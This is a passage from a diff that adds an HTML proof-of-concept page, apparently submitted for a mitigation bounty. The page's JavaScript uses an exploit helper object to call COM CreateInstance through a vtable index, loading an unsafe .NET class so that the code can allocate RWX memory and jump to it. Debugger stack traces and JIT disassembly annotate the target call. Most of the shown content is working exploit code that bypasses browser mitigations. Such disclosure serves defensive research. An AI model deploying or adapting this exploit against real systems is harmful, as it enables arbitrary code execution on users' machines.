+		 * 0000007fa87f7490 00000257a68f0004 [InlinedCallFrame: 0000007fa87f7490] 
+		 * 0000007fa87f7490 00007ff9b0f20d0d [InlinedCallFrame: 0000007fa87f7490] 
+		 * 0000007fa87f7460 00007ff9b0f20d0d DomainBoundILStubClass.IL_STUB_PInvoke()
+		 * 0000007fa87f7530 00007ff9b0f20aa1 toInject.MyClass..ctor()
+		 * 0000007fa87f7888 00007ffa10535d03 [DebuggerU2MCatchHandlerFrame: 0000007fa87f7888] 
+		 * 0000007fa87f78a0 00007ffa10535d03 [GCFrame: 0000007fa87f78a0] 
+		 * 0000007fa87f79f0 00007ffa10535d03 [GCFrame: 0000007fa87f79f0] 
+		 * 0000007fa87f7a28 00007ffa10535d03 [HelperMethodFrame_2OBJ: 0000007fa87f7a28] System.RuntimeTypeHandle.CreateInstance(System.RuntimeType, Boolean, Boolean, Boolean ByRef, System.RuntimeMethodHandleInternal ByRef, Boolean ByRef)
+		 * 0000007fa87f7c20 00007ffa0dbd986a System.RuntimeType.CreateInstanceSlow(Boolean, Boolean, Boolean, System.Threading.StackCrawlMark ByRef)
+		 * 0000007fa87f7c90 00007ffa0dbd9a89 System.Activator.CreateInstance(System.Type, Boolean)
+		 * 0000007fa87f7ce0 00007ffa0dc31d6f System.RuntimeType.CreateInstanceImpl(System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo, System.Object[], System.Threading.StackCrawlMark ByRef)
+		 * 0000007fa87f7d80 00007ffa0dc31a7f System.Activator.CreateInstance(System.Type, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo, System.Object[])
+		 * 0000007fa87f7e00 00007ffa0dc7d29a System.Reflection.Assembly.CreateInstance(System.String, Boolean, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo, System.Object[])
+		 * 0000007fa87f7e50 00007ffa0dc98628 System.Reflection.Assembly.CreateInstance(System.String)
+		 * 0000007fa87f7ea0 00007ffa0e38874b DomainNeutralILStubClass.IL_STUB_COMtoCLR(IntPtr, IntPtr)
+		 * 0000007fa87f8070 00007ffa10532e29 [ComMethodFrame: 0000007fa87f8070] 
+		 *
+		 * Caller is JIT
+		 * xor     r11d,r11d
+		 * mov     rax,qword ptr [rbp-58h]
+		 * mov     qword ptr [rbp-80h],rax
+		 * lea     rax,[00007ff9`b0f20d0d]
+		 * mov     qword ptr [rbp-68h],rax
+		 * mov     rax,qword ptr [rbp-50h]
+		 * mov     byte ptr [rax+0Ch],0
+		 * mov     rax,qword ptr [rbp-48h]
+		 * call    rax <--------------------- Call target address
+		 */
+		log("Load and use my own unsafe .NET binary");
+		var CreateInstanceIdx = 0x29;
+		var targetString = exp.dup_wstring(dotnet_class);
+		var targetBstr = exp.call_function("OLEAUT32.dll", "SysAllocString", targetString);
+		check_ne(targetBstr, 0);
+		var result = exp.allocate(0x20);
+		hresult = exp.call_function_cpp(AssemblyPtr, CreateInstanceIdx, targetBstr, result);
+		check_eq(hresult, 0);
+		
+		log("Failed ...");
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+</script>
+</head>
+<body>
+<h1>Mitigation bounty PoC - Load unsafe .NET IL, allocate RWX and jump to it by @mxatone (Thomas Garnier)</h1>
+<div class="container">
+  <div class="buttonbar">
+    <input type="button" onclick="poc_1()" value="PoC 1 - Load unsafe .NET IL, allocate RWX and jump to it" />
+  </div>
+  <textarea id="log" class="text" wrap="off" placeholder="Log output will be here"></textarea>
+</div>
+</body>
+</html>
